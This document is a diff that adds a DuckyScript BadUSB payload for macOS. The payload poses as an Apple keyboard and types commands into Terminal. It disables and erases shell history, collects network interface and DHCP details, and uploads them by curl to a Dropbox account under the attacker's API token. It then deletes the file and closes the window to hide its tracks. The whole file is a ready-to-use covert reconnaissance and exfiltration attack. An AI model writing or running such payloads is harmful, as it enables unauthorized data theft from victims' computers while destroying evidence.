@@ -1,0 +1,49 @@
+REM Network Recon and Cloud Sync Automation
+REM This script gathers network information from a macOS system
+REM then uploads it to Dropbox for easy synchronization and analysis.
+REM Replace "<API access token here>" with your actual API access token. line 25
+
+REM Title: Network Recon to Dropbox 
+REM Author: Narsty
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Recon
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING  osascript -e 'do shell script "networksetup -listallhardwareports > \"$HOME/Desktop/network_interfaces.txt\" && ipconfig getpacket en0 >> \"$HOME/Desktop/network_interfaces.txt\""'
+DELAY 1000
+ENTER
+DELAY 500
+STRING  curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API access token here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/network_interfaces.txt\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @"$HOME/Desktop/network_interfaces.txt"
+DELAY 2000
+ENTER
+DELAY 5000
+STRING  rm -r ~/Desktop/network_interfaces.txt
+DELAY 500
+ENTER
+STRING  clear
+DELAY 500
+ENTER
+GUI w
+DELAY 500 
+ENTER 
+
+
